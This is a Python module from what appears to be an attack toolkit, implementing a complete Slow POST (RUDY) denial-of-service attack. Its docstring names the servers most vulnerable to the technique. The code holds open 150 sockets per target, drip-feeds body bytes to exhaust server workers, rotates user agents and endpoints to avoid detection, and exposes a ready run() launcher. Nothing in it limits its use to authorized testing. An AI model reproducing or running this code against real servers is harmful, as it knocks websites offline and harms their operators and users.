"""
modules/slow_post.py - Slow POST (R-U-Dead-Yet / RUDY variant)
Slow HTTP POST attack: declare large Content-Length, drip-feed body bytes.

How it works:
  1. Open TCP connection to server
  2. Send complete HTTP POST headers including:
     Content-Length: 10000000  (declare 10MB body)
  3. Send 1 byte of body every `interval` seconds
  4. Server keeps connection open waiting for the full body
  5. Thread/worker blocked -> same exhaustion as Slowloris

Differences vs Slowloris:
  - Slowloris: incomplete HEADERS (server waits for \r\n\r\n)
  - Slow POST: complete headers, incomplete BODY
  - Slow POST bypasses servers that have header timeout but no body timeout
  - More effective against FastCGI / PHP-FPM backends

Targets:
  - Apache with mod_php / PHP-FPM
  - Node.js (body parsing middleware)
  - Any server with body-size checks but no read-rate enforcement

Effective against:
  nginx: partially (proxy_read_timeout applies, default 60s)
  Apache: highly effective (no body rate enforcement by default)
  IIS:   effective
"""

import socket
import ssl
import random
import time
import threading
from dataclasses import dataclass, field
from typing import Optional


_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15",
]

_ENDPOINTS = ["/", "/login", "/upload", "/api/submit", "/contact", "/form"]


@dataclass
class SlowPOSTMetrics:
    sockets_open: int = 0
    sockets_failed: int = 0
    sockets_expired: int = 0
    bytes_dripped: int = 0
    start_time: float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def open(self) -> None:
        with self._lock: self.sockets_open += 1

    def fail(self) -> None:
        with self._lock: self.sockets_failed += 1

    def expire(self) -> None:
        with self._lock:
            self.sockets_open -= 1
            self.sockets_expired += 1

    def drip(self, n: int) -> None:
        with self._lock: self.bytes_dripped += n

    def summary(self) -> dict:
        elapsed = time.time() - self.start_time
        return {
            "sockets_open":    self.sockets_open,
            "sockets_failed":  self.sockets_failed,
            "sockets_expired": self.sockets_expired,
            "bytes_dripped":   self.bytes_dripped,
            "elapsed_s":       round(elapsed, 2),
        }


def _open_slow_post(
    host: str,
    port: int,
    use_ssl: bool,
    content_length: int,
    timeout: float,
) -> Optional[socket.socket]:
    """Open a socket and send POST headers with large Content-Length."""
    endpoint = random.choice(_ENDPOINTS)
    boundary = "----" + "".join(
        random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)
    )

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))

        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        # Send complete headers, large Content-Length
        headers = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {random.choice(_USER_AGENTS)}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            # Body starts here but we only send 1 byte immediately
            "X"
        )
        s.send(headers.encode())
        return s

    except (socket.error, ssl.SSLError, OSError):
        return None


class SlowPOSTEngine:
    """
    Maintains `socket_count` slow POST connections.
    Drips 1 random byte of body every `interval` seconds.
    """

    def __init__(
        self,
        host: str,
        port: int = 80,
        socket_count: int = 150,
        interval: float = 10.0,
        content_length: int = 10_000_000,
        duration: int = 60,
        use_ssl: bool = False,
        socket_timeout: float = 30.0,
    ) -> None:
        self.host = host
        self.port = port
        self.socket_count = socket_count
        self.interval = interval
        self.content_length = content_length
        self.duration = duration
        self.use_ssl = use_ssl
        self.socket_timeout = socket_timeout

        self.metrics = SlowPOSTMetrics()
        self._sockets: list[socket.socket] = []
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def _fill_pool(self) -> None:
        while len(self._sockets) < self.socket_count and not self._stop.is_set():
            s = _open_slow_post(
                self.host, self.port, self.use_ssl,
                self.content_length, self.socket_timeout,
            )
            if s:
                self._sockets.append(s)
                self.metrics.open()
            else:
                self.metrics.fail()
            time.sleep(random.uniform(0.01, 0.03))

    def _main_loop(self) -> None:
        deadline = time.time() + self.duration if self.duration > 0 else float("inf")
        self._fill_pool()

        while not self._stop.is_set() and time.time() < deadline:
            dead = []
            for s in self._sockets:
                try:
                    # Drip 1 random body byte
                    byte = bytes([random.randint(65, 90)])
                    s.send(byte)
                    self.metrics.drip(1)
                except (socket.error, OSError):
                    dead.append(s)

            for s in dead:
                try: s.close()
                except Exception: pass
                self._sockets.remove(s)
                self.metrics.expire()

            self._fill_pool()
            jitter = random.uniform(-1.0, 1.0)
            self._stop.wait(max(0.5, self.interval + jitter))

        for s in self._sockets:
            try: s.close()
            except Exception: pass
        self._sockets.clear()
        self._stop.set()

    def start(self) -> None:
        self._stop.clear()
        self._thread = threading.Thread(target=self._main_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()

    def wait(self) -> None:
        if self._thread:
            self._thread.join(timeout=self.duration + 10)

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()


def run(
    host: str,
    port: int = 80,
    socket_count: int = 150,
    interval: float = 10.0,
    content_length: int = 10_000_000,
    duration: int = 60,
    use_ssl: bool = False,
) -> SlowPOSTEngine:
    """
    Launch Slow POST attack.

    Args:
        host           : Target hostname or IP.
        port           : Target port (80 or 443).
        socket_count   : Concurrent slow POST sockets.
        interval       : Seconds between body byte drips.
        content_length : Declared POST body size (never actually sent fully).
                         10MB default keeps server waiting a very long time.
        duration       : Duration in seconds.
        use_ssl        : TLS wrap for HTTPS targets.

    Returns:
        SlowPOSTEngine (already started).
    """
    engine = SlowPOSTEngine(
        host=host,
        port=port,
        socket_count=socket_count,
        interval=interval,
        content_length=content_length,
        duration=duration,
        use_ssl=use_ssl,
    )
    engine.start()
    return engine
